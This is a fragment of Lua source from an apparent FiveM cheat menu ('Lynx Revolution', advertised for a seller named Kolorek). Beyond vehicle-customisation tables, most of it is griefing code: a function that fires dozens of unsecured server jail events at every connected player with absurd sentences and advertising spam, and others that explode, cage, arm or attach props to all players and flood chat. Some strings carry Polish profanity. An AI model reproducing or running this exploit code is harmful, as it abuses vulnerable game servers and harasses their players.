    local horns={["Stock Horn"]=-1,["Truck Horn"]=1,["Police Horn"]=2,["Clown Horn"]=3,["Musical Horn 1"]=4,["Musical Horn 2"]=5,["Musical Horn 3"]=6,["Musical Horn 4"]=7,["Musical Horn 5"]=8,["Sad Trombone Horn"]=9,["Classical Horn 1"]=10,["Classical Horn 2"]=11,["Classical Horn 3"]=12,["Classical Horn 4"]=13,["Classical Horn 5"]=14,["Classical Horn 6"]=15,["Classical Horn 7"]=16,["Scaledo Horn"]=17,["Scalere Horn"]=18,["Salemi Horn"]=19,["Scalefa Horn"]=20,["Scalesol Horn"]=21,["Scalela Horn"]=22,["Scaleti Horn"]=23,["Scaledo Horn High"]=24,["Jazz Horn 1"]=25,["Jazz Horn 2"]=26,["Jazz Horn 3"]=27,["Jazz Loop Horn"]=28,["Starspangban Horn 1"]=28,["Starspangban Horn 2"]=29,["Starspangban Horn 3"]=30,["Starspangban Horn 4"]=31,["Classical Loop 1"]=32,["Classical Horn 8"]=33,["Classical Loop 2"]=34}
    local neonColors={["White"]={255,255,255},["Blue"]={0,0,255},["Electric Blue"]={0,150,255},["Mint Green"]={50,255,155},["Lime Green"]={0,255,0},["Yellow"]={255,255,0},["Golden Shower"]={204,204,0},["Orange"]={255,128,0},["Red"]={255,0,0},["Pony Pink"]={255,102,255},["Hot Pink"]={255,0,255},["Purple"]={153,0,153}}
    local paintsClassic={{name="Black",id=0},{name="Carbon Black",id=147},{name="Graphite",id=1},{name="Anhracite Black",id=11},{name="Black Steel",id=2},{name="Dark Steel",id=3},{name="Silver",id=4},{name="Bluish Silver",id=5},{name="Rolled Steel",id=6},{name="Shadow Silver",id=7},{name="Stone Silver",id=8},{name="Midnight Silver",id=9},{name="Cast Iron Silver",id=10},{name="Red",id=27},{name="Torino Red",id=28},{name="Formula Red",id=29},{name="Lava Red",id=150},{name="Blaze Red",id=30},{name="Grace Red",id=31},{name="Garnet Red",id=32},{name="Sunset Red",id=33},{name="Cabernet Red",id=34},{name="Wine Red",id=143},{name="Candy Red",id=35},{name="Hot Pink",id=135},{name="Pfsiter Pink",id=137},{name="Salmon Pink",id=136},{name="Sunrise Orange",id=36},{name="Orange",id=38},{name="Bright Orange",id=138},{name="Gold",id=99},{name="Bronze",id=90},{name="Yellow",id=88},{name="Race Yellow",id=89},{name="Dew Yellow",id=91},{name="Dark Green",id=49},{name="Racing Green",id=50},{name="Sea Green",id=51},{name="Olive Green",id=52},{name="Bright Green",id=53},{name="Gasoline Green",id=54},{name="Lime Green",id=92},{name="Midnight Blue",id=141},{name="Galaxy Blue",id=61},{name="Dark Blue",id=62},{name="Saxon Blue",id=63},{name="Blue",id=64},{name="Mariner Blue",id=65},{name="Harbor Blue",id=66},{name="Diamond Blue",id=67},{name="Surf Blue",id=68},{name="Nautical Blue",id=69},{name="Racing Blue",id=73},{name="Ultra Blue",id=70},{name="Light Blue",id=74},{name="Chocolate Brown",id=96},{name="Bison Brown",id=101},{name="Creeen Brown",id=95},{name="Feltzer Brown",id=94},{name="Maple Brown",id=97},{name="Beechwood Brown",id=103},{name="Sienna Brown",id=104},{name="Saddle Brown",id=98},{name="Moss Brown",id=100},{name="Woodbeech Brown",id=102},{name="Straw Brown",id=99},{name="Sandy Brown",id=105},{name="Bleached Brown",id=106},{name="Schafter Purple",id=71},{name="Spinnaker Purple",id=72},{name="Midnight Purple",id=142},{name="Bright Purple",id=145},{name="Cream",id=107},{name="Ice White",id=111},{name="Frost White",id=112}}
    local paintsMatte={{name="Black",id=12},{name="Gray",id=13},{name="Light Gray",id=14},{name="Ice White",id=131},{name="Blue",id=83},{name="Dark Blue",id=82},{name="Midnight Blue",id=84},{name="Midnight Purple",id=149},{name="Schafter Purple",id=148},{name="Red",id=39},{name="Dark Red",id=40},{name="Orange",id=41},{name="Yellow",id=42},{name="Lime Green",id=55},{name="Green",id=128},{name="Forest Green",id=151},{name="Foliage Green",id=155},{name="Olive Darb",id=152},{name="Dark Earth",id=153},{name="Desert Tan",id=154}}
    local paintsMetal={{name="Brushed Steel",id=117},{name="Brushed Black Steel",id=118},{name="Brushed Aluminum",id=119},{name="Pure Gold",id=158},{name="Brushed Gold",id=159}}
    defaultVehAction = ""
    if GetVehiclePedIsUsing(PlayerPedId()) then
      veh = GetVehiclePedIsUsing(PlayerPedId())
    end

    local Enabled = Pryorbypessed3
    local LynxIcS = "LynxX"
    local LynxIcZ = "Lynx ~u~Revolution"
    local sMX = "SelfMenu"
    local sMXS = "Self Menu"
    local LMX = "LuaMenu"
    local VRPT = "VRPTriggers"
    local TRPM = "TeleportMenu"
    local WMPS = "WeaponMenu"
    local advm = "AdvM"
    local VMS = "VehicleMenu"
    local OPMS = "OnlinePlayerMenu"
    local poms = "PlayerOptionsMenu"
    local dddd = "Destroyer"
    local esms = "ESXMoney"
    local crds = "Credits"
	local TrollP = "Trollpp"
	local MoneyP = "Moneypp"
    local MSTC = "MiscTriggers"
    local cAoP = "CarOptions"
    local MTS = "MainTrailer"
    local mtsl = "MainTrailerSel"
    local LSCC = "LSC"
    local espa = "ESPMenu"
    local CMSMS = "CsMenu"
    local gccccc = "GCT"
    local GAPA = "GlobalAllPlayers"
    local Tmas = "Trollmenu"
    local ESXC = "ESXCustom"
    local ESXD = "ESXDrugs"
    local SPD = "SpawnPeds"
    local bmm = "BoostMenu"
    local prof = "performance"
    local tngns = "tunings"
    local GSWP = "GiveSingleWeaponPlayer"
    local WOP = "WeaponOptions"
    local CTS = "CarTypeSelection"
    local CTSmtsps = "MainTrailerSpa"
    local CTSa = "CarTypes"
    local MSMSA = "ModSelect"
    local WTSbull = "WeaponTypeSelection"
    local WTNe = "WeaponTypes"

    local function DrawTxt(text, x, y)
      SetTextFont(1)
      SetTextProportional(1)
      SetTextScale(0.0, 0.6)
      SetTextDropshadow(1, 0, 0, 0, 255)
      SetTextEdge(1, 0, 0, 0, 255)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      AddTextComponentString(text)
      DrawText(x, y)
    end

    function RequestModelSync(mod)
      local model = GetHashKey(mod)
      RequestModel(model)
      while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
      end
    end

    function ApplyShockwave(entity)
      local pos = GetEntityCoords(PlayerPedId())
      local coord=GetEntityCoords(entity)
      local dx=coord.x - pos.x
      local dy=coord.y - pos.y
      local dz=coord.z - pos.z
      local distance=math.sqrt(dx*dx+dy*dy+dz*dz)
      local distanceRate=(50/distance)*math.pow(1.04,1-distance)
      ApplyForceToEntity(entity, 1, distanceRate*dx,distanceRate*dy,distanceRate*dz, math.random()*math.random(-1,1),math.random()*math.random(-1,1),math.random()*math.random(-1,1), Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
    end

    local function DoJesusTick(radius)
      local player = PlayerPedId()
      local coords = GetEntityCoords(PlayerPedId())
      local playerVehicle = GetPlayersLastVehicle()
      local inVehicle=IsPedInVehicle(player,playerVehicle,Pryorbypessed3)

      DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, Pryorbypessed2, Pryorbypessed3, 2, Pryorbypessed, Pryorbypessed, Pryorbypessed2)

      for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          ApplyShockwave(k)
        end
      end

      for k in EnumeratePeds() do
        if k~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius*1.2 then
          RequestControlOnce(k)
          SetPedRagdollOnCollision(k,Pryorbypessed3)
          SetPedRagdollForceFall(k)
          ApplyShockwave(k)
        end
      end
    end

    local function DRFT()
      DisablePlayerFiring(PlayerPedId(), Pryorbypessed3)
      if IsDisabledControlPressed(0, 24) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)

        ClearAreaOfProjectiles(launchPos, 0.0, 1)

        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), Pryorbypessed3, Pryorbypessed3, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), Pryorbypessed3, Pryorbypessed3, 24000.0)
      end
    end



    local function MagnetoBoy()
      magnet = not magnet

      if magnet then

        Citizen.CreateThread(function()
        notify("~h~Pressiona ~r~E ~s~to use")

        local ForceKey = 38
        local Force = 0.5
        local KeyPressed = Pryorbypessed2
        local KeyTimer = 0
        local KeyDelay = 15
        local ForceEnabled = Pryorbypessed2
        local StartPush = Pryorbypessed2

        function forcetick()

          if (KeyPressed) then
            KeyTimer = KeyTimer + 1
            if(KeyTimer >= KeyDelay) then
              KeyTimer = 0
              KeyPressed = Pryorbypessed2
            end
          end



          if IsControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
            KeyPressed = Pryorbypessed3
            ForceEnabled = Pryorbypessed3
          end

          if (StartPush) then

            StartPush = Pryorbypessed2
            local pid = PlayerPedId()
            local CamRot = GetGameplayCamRot(2)

            local force = 5

            local Fx = -( math.sin(math.rad(CamRot.z)) * force*10 )
            local Fy = ( math.cos(math.rad(CamRot.z)) * force*10 )
            local Fz = force * (CamRot.x*0.2)

            local PlayerVeh = GetVehiclePedIsIn(pid, Pryorbypessed2)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, Pryorbypessed2)
              if IsEntityOnScreen(k) and k ~= PlayerVeh then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= pid then
                ApplyForceToEntity(k, 1, Fx, Fy,Fz, 0,0,0, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
              end
            end

          end


          if IsControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
            KeyPressed = Pryorbypessed3
            StartPush = Pryorbypessed3
            ForceEnabled = Pryorbypessed2
          end

          if (ForceEnabled) then
            local pid = PlayerPedId()
            local PlayerVeh = GetVehiclePedIsIn(pid, Pryorbypessed2)

            Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)

            DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, Pryorbypessed2, Pryorbypessed3, 2, Pryorbypessed, Pryorbypessed, Pryorbypessed2)

            for k in EnumerateVehicles() do
              SetEntityInvincible(k, Pryorbypessed3)
              if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                RequestControlOnce(k)
                FreezeEntityPosition(k, Pryorbypessed2)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

            for k in EnumeratePeds() do
              if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                RequestControlOnce(k)
                SetPedToRagdoll(k, 4000, 5000, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
                FreezeEntityPosition(k, Pryorbypessed2)
                Oscillate(k, Markerloc, 0.5, 0.3)
              end
            end

          end

        end

        while magnet do forcetick() Wait(0) end
          end)
        else notify("~r~~h~Disabled")
        end

      end

			  
      local function jailall()
        local pbase = GetActivePlayers()
          for i=0, 256 do
          		TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Jailed")
                TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
                TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
                TSE("js:jailuser", GetPlayerServerId(i), 45 * 60, "Jailed")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432)
				TSE("esx_jailer:*", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432)
				TSE("esx_jailer:eloelo90", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432)
				TSE("esx_jailer:wwiezienie", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432)
				TSE("searp:sendToJail", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396:D", -32432432423432432)
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(i), 5023432432434200, "POZDRO JEBAC WAS", -32432432423432432)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396:D", -32432432423432432)
				TSE("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
				TSE("17A34C820A685513C5B4ADDD85968B9E905CC300A261EB55D299ABCB6C90AAA872712B3B6C13DC41913FCC2BE84A07EF9300DC4E89669A4B0E6FBB344A69D239", GetPlayerServerId(i), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D", -32432432423432432)
				TSE("esx_jailer:fabianfudalijebanyprzyglup", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D | 'a :D", -32432432423432432)
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "MENU KUP OD Kolorek#1396 :D|  :D", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 9999999999)
				TSE("esx-jail:jailPlayer",   GetPlayerServerId(i), 3000)
				TSE("esx_jailer:jailhype", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "MENU KUP OD Kolorek#1396 :D?", 9333397)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "MENU KUP OD Kolorek#1396 :D?", 9333397)
				TSE("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 9999999999)
				TSE("esx_policejob:message", GetPlayerServerId(i), "MENU KUP OD Kolorek#1396 :D")
				TSE("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TSE("8321hiue89js", GetPlayerServerId(i), 5007, "MENU KUP OD Kolorek#1396 :D", 323434532532, securityToken)
				TSE("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "MENU KUP OD Kolorek#1396 :D", 500324532)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "MENU KUP OD Kolorek#1396 :D")
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396:D")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."MENU KUP OD Kolorek#1396 :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396:D", 300)
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396| Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "hMENU KUP OD Kolorek#1396 | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "MENU KUP OD Kolorek#1396| Darmowe cheaty na Fivem'a :D")
				TSE("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." MENU KUP OD Kolorek#1396| Darmowe cheaty na Fivem'a :D")
				TSE('esx_policejob:zakujtypeczka',  GetPlayerServerId(i))
				TSE('esx_ruski_areszt:startAreszt', GetPlayerServerId(i))
				TSE("arisonarp:wiezienie", GetPlayerServerId(i), 9999999999 * 60, "MENU KUP OD Kolorek#1396 | Darmowe cheaty na Fivem'a :D", 1337)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 999999 * 60, "MENU KUP OD Kolorek#1396 | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "MENU KUP OD Kolorek#1396 | Darmowe cheaty na Fivem'a :D")
				TSE("wysparp_tablet:SendMessage", GetPlayerServerId(i), 9999 * 60, "FAJNY TEN ANTY LYNX", 9999999999)
				TSE("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 9999 * 60, "TEST", 1,2137)
				TSE("esxjailer:sendToJail2", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 9995345349999999)
				TSE("esx_jaler:sendToWiezz", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "MENU KUP OD Kolorek#1396 :D", 9995345349999999)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937 * 60, "MENU KUP OD Kolorek#1396 :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D")
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396:D")
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396", 99953)
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D")
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396", 99953)
				TSE("esx_jailer:jail", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("luki_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396", 99953)
				TSE("esx_jail:sendToJail", GetPlayerServerId(i), 99999 * 60)
				TSE("js:jailuser", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "MENU KUP OD Kolorek#1396 :D")
				TSE("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 1,2137)
				TSE("esxjailer:sendToJail2", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396:D", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396", 99953)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "MENU KUP OD Kolorek#1396 :D", 99953)
				TSE("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "MENU KUP OD Kolorek#1396:D", 9999)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(i), 100 * 60, "MENU KUP OD Kolorek#1396", 999)
				TSE("esx-qalle-jail:wyslijwiezienie", GetPlayerServerId(i), 60*1, "MENU KUP OD Kolorek#1396", 111)

        end
      end

      local function GiveAllWeapons(target)
        local ped = GetPlayerPed(target)
        for i=0, #allWeapons do
          GiveWeaponToPed(ped, GetHashKey(allWeapons[i]), 9999, Pryorbypessed2, Pryorbypessed2)
        end
      end

      local function weaponsall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          GiveAllWeapons(i)
        end
      end

      local function explodeall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local ped = GetPlayerPed(i)
          local coords = GetEntityCoords(ped)
          AddExplosion(coords.x+1, coords.y+1, coords.z+1, 4, 10000.0, Pryorbypessed3, Pryorbypessed2, 0.0)
        end
      end

      local function borgarall()
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          if IsPedInAnyVehicle(GetPlayerPed(i), Pryorbypessed3) then
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
            AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(i), Pryorbypessed2), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), Pryorbypessed2), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
          else
            local hamburg = "xs_prop_hamburgher_wl"
            local hamburghash = GetHashKey(hamburg)
            while not HasModelLoaded(hamburghash) do
              Citizen.Wait(0)
              RequestModel(hamburghash)
            end
            local hamburger = CreateObject(hamburghash, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
            AttachEntityToEntity(hamburger, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
          end
        end
      end

	  local function cageall()
		local pbase = GetActivePlayers()
        for i = 1, #pbase do
          x, y, z = table.unpack(GetEntityCoords(i))
          roundx = tonumber(string.format("%.2f", x))
          roundy = tonumber(string.format("%.2f", y))
          roundz = tonumber(string.format("%.2f", z))
          while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do
            Citizen.Wait(0)
            RequestModel(GetHashKey("prop_fnclink_05crnr1"))
          end
          local cage1 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
          local cage2 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
          SetEntityHeading(cage1, -90.0)
          SetEntityHeading(cage2, 90.0)
          FreezeEntityPosition(cage1, Pryorbypessed3)
          FreezeEntityPosition(cage2, Pryorbypessed3)
        end
      end

      local function bananapartyall()
        Citizen.CreateThread(function()
        for c = 0, 9 do

          TSE("_chat:messageEntered", "KolorekMenu kup od Kolorek#1396 ^110", { 141, 211, 255 }, "^"..c.."KOLOREKMenu!")
        end
        local pbase = GetActivePlayers()
        for i=0, #pbase do
          local pisello = CreateObject(-1207431159, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
          local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
          local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
          AttachEntityToEntity(pisello, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
          AttachEntityToEntity(pisello2, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
          AttachEntityToEntity(pisello3, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
        end
        end)
      end

      local function RespawnPed(ped, coords, heading)
